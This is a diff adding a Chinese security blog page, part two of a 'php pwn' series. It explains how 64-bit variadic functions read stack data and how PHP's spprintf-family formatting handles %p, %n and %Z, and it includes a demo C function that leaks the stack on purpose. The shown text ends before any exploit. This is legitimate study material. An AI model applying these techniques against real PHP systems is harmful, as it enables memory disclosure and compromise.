@@ -1,0 +1,725 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.font.im/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/fancybox/jquery.fancybox.min.css">
+
+<script data-ad-client="ca-pub-9381923643450020" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"blog.wonderkun.cc","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="php pwn学习入门二 (格式化字符串漏洞)本文是学习php二进制漏洞利用的第二篇文章，格式化字符串漏洞是CTF比赛中比较常见的漏洞，本文主要介绍一下64位下php中的格式化字符串漏洞的利用思路。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="php pwn学习入门二 (格式化字符串漏洞)">
+<meta property="og:url" content="http://blog.wonderkun.cc/2020/05/13/php%20pwn%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8%E4%BA%8C/index.html">
+<meta property="og:site_name" content="wonderkun&#39;s | blog">
+<meta property="og:description" content="php pwn学习入门二 (格式化字符串漏洞)本文是学习php二进制漏洞利用的第二篇文章，格式化字符串漏洞是CTF比赛中比较常见的漏洞，本文主要介绍一下64位下php中的格式化字符串漏洞的利用思路。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://pic.wonderkun.cc/uploads/2020/05/2020-05-11-16-22-16.png">
+<meta property="article:published_time" content="2020-05-13T11:57:14.000Z">
+<meta property="article:modified_time" content="2024-11-18T11:46:14.718Z">
+<meta property="article:author" content="wonderkun">
+<meta property="article:tag" content="php">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="学习记录">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://pic.wonderkun.cc/uploads/2020/05/2020-05-11-16-22-16.png">
+
+<link rel="canonical" href="http://blog.wonderkun.cc/2020/05/13/php%20pwn%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8%E4%BA%8C/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>php pwn学习入门二 (格式化字符串漏洞) | wonderkun's | blog</title>
+  
+
+
+  <script>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?1a23c3c0cdc421d3cfd3c63dc9721ffe";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">wonderkun's | blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">share with you!</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-sitemap">
+
+    <a href="/sitemap.xml" rel="section"><i class="sitemap fa-fw"></i>站点地图</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+  <a href="https://github.com/wonderkun" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://blog.wonderkun.cc/2020/05/13/php%20pwn%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8%E4%BA%8C/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://pic.wonderkun.cc/uploads/2016/04/09451H922-11.jpg">
+      <meta itemprop="name" content="wonderkun">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="wonderkun's | blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          php pwn学习入门二 (格式化字符串漏洞)
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-05-13 19:57:14" itemprop="dateCreated datePublished" datetime="2020-05-13T19:57:14+08:00">2020-05-13</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-11-18 19:46:14" itemprop="dateModified" datetime="2024-11-18T19:46:14+08:00">2024-11-18</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" itemprop="url" rel="index"><span itemprop="name">学习记录</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/2020/05/13/php%20pwn%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8%E4%BA%8C/" class="post-meta-item leancloud_visitors" data-flag-title="php pwn学习入门二 (格式化字符串漏洞)" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2020/05/13/php%20pwn%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8%E4%BA%8C/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2020/05/13/php%20pwn%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8%E4%BA%8C/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="php-pwn学习入门二-格式化字符串漏洞"><a href="#php-pwn学习入门二-格式化字符串漏洞" class="headerlink" title="php pwn学习入门二 (格式化字符串漏洞)"></a>php pwn学习入门二 (格式化字符串漏洞)</h2><p>本文是学习php二进制漏洞利用的第二篇文章，格式化字符串漏洞是CTF比赛中比较常见的漏洞，本文主要介绍一下64位下php中的格式化字符串漏洞的利用思路。</p>
+<a id="more"></a>
+<h3 id="从可变参函数谈起"><a href="#从可变参函数谈起" class="headerlink" title="从可变参函数谈起"></a>从可变参函数谈起</h3><p>学习c标准库中类似于<code>printf</code>这类函数的格式化字符串漏洞时，我就存在一些疑问：</p>
+<ul>
+<li><ol>
+<li>为什么使用多个%p或者%x泄露的是栈上的数据？这是<code>printf</code>函数实现上的问题吗，可变参数都存储在什么位置？</li>
+</ol>
+</li>
+<li><ol start="2">
+<li>这存在越界读取数据的行为到底是<code>printf</code>函数的问题，还是可变参函数的通病？</li>
+</ol>
+</li>
+</ul>
+<p>为了搞清楚上述的两个问题，需要先搞明白可变参函数的实现原理，首先自己写一个可变参函数，调试一下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdarg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sum</span><span class="params">(<span class="keyword">int</span> n, ...)</span>  <span class="comment">//第一个参数表明有可变参数有多少个相加  </span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    va_list ap;</span><br><span class="line">    va_start(ap, n);</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(n--)</span><br><span class="line">        sum += va_arg(ap, <span class="keyword">int</span>);</span><br><span class="line">    va_end(ap);</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,sum(<span class="number">5</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>下面对编译器中实现的几个宏进行注释说明：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">va_start</span><span class="params">( va_list arg_ptr, prev_param )</span></span>; <span class="comment">//初始化pArgs指针，使其指向第一个可变参数。该宏第二个参数是变参列表的前一个参数，即最后一个固定参数</span></span><br><span class="line"><span class="function">type <span class="title">va_arg</span><span class="params">( va_list arg_ptr, type )</span></span>;  <span class="comment">//该宏返回变参列表中的当前变参值并使pArgs指向列表中的下个变参。该宏第二个参数是要返回的当前变参类型，若函数有多个可变参数，则依次调用va_arg宏获取各个变参</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">va_end</span><span class="params">( va_list arg_ptr )</span></span>; <span class="comment">// 将指针pArgs置为无效，结束变参的获取</span></span><br></pre></td></tr></table></figure>
+
+<p>其中 <code>va_list</code>结构体在64位上大概长这个样子:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">   <span class="keyword">unsigned</span> <span class="keyword">int</span> gp_offset;</span><br><span class="line">   <span class="keyword">unsigned</span> <span class="keyword">int</span>  fp_offset;</span><br><span class="line">   <span class="keyword">void</span> *  overflow_arg_area ;</span><br><span class="line">   <span class="keyword">void</span> * reg_save_area; </span><br><span class="line">&#125; va_list_entry ;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span>  va_list_entry[<span class="number">0</span>] va_list;</span><br></pre></td></tr></table></figure>
+
+<p>对上述的sum函数进行反编译：</p>
+<p><img src="http://pic.wonderkun.cc/uploads/2020/05/2020-05-11-16-22-16.png" alt="http://pic.wonderkun.cc/uploads/2020/05/2020-05-11-16-22-16.png"></p>
+<!-- ![http://pic.wonderkun.ccimg/2020-05-11-16-22-16.png](http://pic.wonderkun.ccimg/2020-05-11-16-22-16.png) -->
+
+<p>当 <code>ap[0].gp_offset &lt;= 0x2F</code>时 ， <code>v1</code>的取值是 <code>ap[0].reg_save_area + ap[0].gp_offset</code> ,当 <code>ap[0].gp_offset &gt; 0x2F</code>时，<code>v1</code>的取值是 <code>v1 = ap[0].overflow_arg_area;</code>。</p>
+<p>为了搞清楚，<code>va_list_entry</code>每个字段的含义，需要先来看一下<code>ap</code>的初始化过程：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">push    rbp</span><br><span class="line">mov     rbp, rsp</span><br><span class="line">sub     rsp, 0F0h</span><br><span class="line">mov     [rbp+n], edi</span><br><span class="line">mov     [rbp+var_A8], rsi</span><br><span class="line">mov     [rbp+var_A0], rdx</span><br><span class="line">mov     [rbp+var_98], rcx</span><br><span class="line">mov     [rbp+var_90], r8</span><br><span class="line">mov     [rbp+var_88], r9</span><br><span class="line"></span><br><span class="line">mov     [rbp+ap.gp_offset], 8</span><br><span class="line">mov     [rbp+ap.fp_offset], 30h ; &#39;0&#39;</span><br><span class="line">lea     rax, [rbp+arg_0]</span><br><span class="line">mov     [rbp+ap.overflow_arg_area], rax</span><br><span class="line">lea     rax, [rbp+var_B0]</span><br><span class="line">mov     [rbp+ap.reg_save_area], rax</span><br></pre></td></tr></table></figure>
+
+<p>这里可以看到 <code>ap.gp_offset</code>被初始化为8，它表示当前初始化<code>va_list ap</code>的函数中固定参数的个数，<code>ap.gp_offset = 固定参数个数*8</code>,<code>ap.fp_offset</code>这个的含义我还没理解，暂时未知，以后遇到了再加上去。 <code>ap.overflow_arg_area</code>保存的是 <code>rbp+0x10</code>(因为在32位中，这个位置保存的是函数的第一个参数，所以ida习惯性的重命名为<code>rbp+arg_0</code>)。<code>ap.reg_save_area</code>保存的是<code>rbp-0xb0</code>，它加上<code>ap.gp_offset</code>恰好就是函数第一个可变参数<code>rsi</code>保存的位置<code>rbp+var_A8</code>。</p>
+<p>通过上述分析，就明白了64位的可变参函数的工作过程如下：</p>
+<ol>
+<li>首先将rsi,rdx, rcx,r8,r9 这五个用于传参的寄存器在当前栈空间中进行备份。</li>
+<li>初始化结构体<code>ap</code>, <code>ap.reg_save_area</code>保存<code>rsi</code>在栈上备份位置-8的位置，<code>ap.overflow_arg_area</code>保存的是<code>rbp+0x10</code>。</li>
+<li>在使用可变参数时，前五个在当前函数栈帧中找，后续的参数在自己调用者的函数栈帧中找。</li>
+</ol>
+<p>明白了上述的工作过程，就解释了格式化字符串漏洞为啥泄露的是栈上的数据了。由于可变参函数参数个数不确定的特性导致无法合理的控制数据读取的边界，所以即使我们自己编写的可变参函数也可能存在泄露栈数据的问题，就拿上述的<code>sum</code>函数来讲，将代码改成如下。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdarg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sum</span><span class="params">(<span class="keyword">int</span> n, ...)</span>  <span class="comment">//第一个参数表明有可变参数有多少个相加  </span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    va_list ap;</span><br><span class="line">    va_start(ap, n);</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(n--)</span><br><span class="line">        sum += va_arg(ap, <span class="keyword">int</span>);</span><br><span class="line">    va_end(ap);</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n; </span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,sum(n,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>当输入的n&gt;=6时，就会泄露栈上的信息。</p>
+<h3 id="php中的格式化字符串函数"><a href="#php中的格式化字符串函数" class="headerlink" title="php中的格式化字符串函数"></a>php中的格式化字符串函数</h3><p>php中的格式化字符串函数主要有如下四个：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> spprintf zend_spprintf</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> strpprintf zend_strpprintf</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> vspprintf zend_vspprintf</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> vstrpprintf zend_vstrpprintf</span></span><br><span class="line"></span><br><span class="line"><span class="function">ZEND_API <span class="keyword">size_t</span> <span class="title">zend_spprintf</span><span class="params">(<span class="keyword">char</span> **message, <span class="keyword">size_t</span> max_len, <span class="keyword">const</span> <span class="keyword">char</span> *format, ...)</span> </span>;</span><br><span class="line"><span class="function">ZEND_API zend_string *<span class="title">zend_strpprintf</span><span class="params">(<span class="keyword">size_t</span> max_len, <span class="keyword">const</span> <span class="keyword">char</span> *format, ...)</span> </span>;</span><br><span class="line"><span class="function">ZEND_API <span class="keyword">size_t</span> <span class="title">zend_vspprintf</span><span class="params">(<span class="keyword">char</span> **pbuf, <span class="keyword">size_t</span> max_len, <span class="keyword">const</span> <span class="keyword">char</span> *format, va_list ap)</span></span>;</span><br><span class="line"><span class="function">ZEND_API zend_string *<span class="title">zend_vstrpprintf</span><span class="params">(<span class="keyword">size_t</span> max_len, <span class="keyword">const</span> <span class="keyword">char</span> *format, va_list ap)</span></span></span><br></pre></td></tr></table></figure>
+
+<p>这四个函数在<code>format</code>参数被控制的情况下都会产生相似的漏洞，但是需要注意的是这四个函数中有两个<code>zend_vspprintf</code>,<code>zend_vstrpprintf</code>是非可变参函数，如果想要调用这个两个函数，就需要在外层封装一个可变参函数，然后在内部调用这两个函数。这点非常重要，因为牵扯到<code>va_list_entry</code>的初始化的问题，它初始化位置的不同也就意味着之后泄露的栈信息位置的差异(没有理解这句话的在读一遍第一节)。</p>
+<p>这四个函数的<code>format</code>解析都是在函数<code>xbuf_format_converter</code>中完成的， 下面对这个函数中比较关键的几个标志进行说明：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main/spprintf.c</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">xbuf_format_converter</span><span class="params">(<span class="keyword">void</span> *xbuf, zend_bool is_char, <span class="keyword">const</span> <span class="keyword">char</span> *fmt, va_list ap)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// ......</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> <span class="string">'p'</span>:</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">sizeof</span>(<span class="keyword">char</span> *) &lt;= <span class="keyword">sizeof</span>(u_wide_int)) &#123;</span><br><span class="line">            ui_num = (u_wide_int)((<span class="keyword">size_t</span>) va_arg(ap, <span class="keyword">char</span> *));</span><br><span class="line">            s = ap_php_conv_p2(ui_num, <span class="number">4</span>, <span class="string">'x'</span>,</span><br><span class="line">                    &amp;num_buf[NUM_BUF_SIZE], &amp;s_len);</span><br><span class="line">            <span class="keyword">if</span> (ui_num != <span class="number">0</span>) &#123;</span><br><span class="line">                *--s = <span class="string">'x'</span>;</span><br><span class="line">                *--s = <span class="string">'0'</span>;</span><br><span class="line">                s_len += <span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            s = <span class="string">"%p"</span>;</span><br><span class="line">            s_len = <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        pad_char = <span class="string">' '</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">case</span> <span class="string">'n'</span>:</span><br><span class="line">        *(va_arg(ap, <span class="keyword">int</span> *)) = is_char? (<span class="keyword">int</span>)((smart_string *)xbuf)-&gt;len : (<span class="keyword">int</span>)ZSTR_LEN(((smart_str *)xbuf)-&gt;s);</span><br><span class="line">        <span class="keyword">goto</span> skip_output;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        * Always extract the argument as a "char *" pointer. We</span></span><br><span class="line"><span class="comment">        * should be using "void *" but there are still machines</span></span><br><span class="line"><span class="comment">        * that don't understand it.</span></span><br><span class="line"><span class="comment">        * If the pointer size is equal to the size of an unsigned</span></span><br><span class="line"><span class="comment">        * integer we convert the pointer to a hex number, otherwise</span></span><br><span class="line"><span class="comment">        * we print "%p" to indicate that we don't handle "%p".</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> <span class="string">'Z'</span>: &#123;</span><br><span class="line">        zvp = (zval*) va_arg(ap, zval*); <span class="comment">// 把下一个参数作为zval指针类型</span></span><br><span class="line">        free_zcopy = zend_make_printable_zval(zvp, &amp;zcopy);</span><br><span class="line">        <span class="keyword">if</span> (free_zcopy) &#123;</span><br><span class="line">            zvp = &amp;zcopy;</span><br><span class="line">        &#125;</span><br><span class="line">        s_len = Z_STRLEN_P(zvp);</span><br><span class="line">        s = Z_STRVAL_P(zvp);</span><br><span class="line">        <span class="keyword">if</span> (adjust_precision &amp;&amp; (<span class="keyword">size_t</span>)precision &lt; s_len) &#123;</span><br><span class="line">            s_len = precision;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
